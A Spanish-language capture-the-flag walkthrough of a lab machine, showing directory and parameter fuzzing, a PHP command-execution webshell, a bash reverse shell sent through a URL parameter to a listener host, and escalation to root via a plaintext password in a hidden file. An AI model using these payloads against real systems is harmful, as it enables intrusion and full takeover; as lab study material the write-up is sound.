# Herramientas
- Nmap
- Gobuster
- SecLists
# Procedimiento
Escaneamos con nmap los puertos y nos muestra que solamente está habilitado el puerto 80.
![[Pasted image 20250716140218.png]]
Al entrar a la página nos aparece esto:
![[Pasted image 20250716140254.png]]

Si exploramos la página no vemos ningún comentario en el código, pero al inferior notamos esto:
![[Pasted image 20250716140338.png]]

Nos dirigimos a tmp pero no hay nada.
![[Pasted image 20250716140355.png]]

Empleamos la herramienta Gobuster para listar los directorios de la página web y nos encontramos con un `warning.html`. El comando utilizado es:
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.1  
7.0.2 -x .php,.py,.txt,.html
```
![[Pasted image 20250716140447.png]]
Al entrar en  `warning .html`, nos aparece esto:
![[Pasted image 20250716140558.png]]

Podemos suponer que `shell.php` luce así:
```php
<?php
	system($_GET['cmd]);
?>
```

Por lo que ejecutamos el siguiente comando para encontrar el parámetro requerido:
NOTA: `--hl=0` sirve para que no nos muestren los resultados que devuelven el número de líneas igual a 0.
```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http:  
//172.17.0.2/shell.php?FUZZ=id
```

Y logramos encontrar el parámetro (parameter, vaya vaya):
![[Pasted image 20250716141605.png]]

Al ingresar a esta parte nos muestra esto:
![[Pasted image 20250716141645.png]]

Nos ponemos en escucha por el puerto 443 con netcat:
```
nc -nlvp 443
```

Y en la URL vulnerable debe ir:
```
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.1.19/443 0>%261"
```

Recordar que donde está `192.168.1.19` debemos poner nuestro propia IP, esto se consigue colocando `ip a` en la terminal (usualmente está en la interfaz wlan0 o eth0). Una vez hecho esto, conseguimos una reverse shell:
![[Pasted image 20250716142125.png]]Una vez hecho esto, podemos ir a la carpeta que se nos mostró en un inicio:
```
cd ~/tmp
ls -la
total 12  
drwxrwxrwt 1 root root 4096 Jul 16 17:59 .  
drwxr-xr-x 1 root root 4096 Jul 16 17:59 ..  
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt

cat .secret
contraseñaderoot123

su root

whoami
root
```

Y una vez más, hemos logrado hackear esta máquina y elevar nuestros privilegios :3